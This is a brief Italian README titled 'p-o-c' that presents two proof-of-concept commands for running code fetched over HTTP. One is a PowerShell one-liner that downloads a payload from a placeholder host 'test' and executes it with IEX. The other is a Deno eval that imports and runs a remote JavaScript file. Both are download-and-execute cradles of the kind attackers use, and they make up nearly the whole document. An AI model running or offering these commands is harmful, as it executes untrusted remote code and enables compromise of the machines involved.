# p-o-c

Comando PowerShell per esecuzione payload letto via HTTP:
``` powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://test/test.txt')"
```

Comando per invocare l'esecuzione di uno JS con Deno con importazione ed esecuzione di un contenuto letto via HTTP:
``` powershell
deno eval --allow-net=test "import('http://test/messaggio.js')"
```
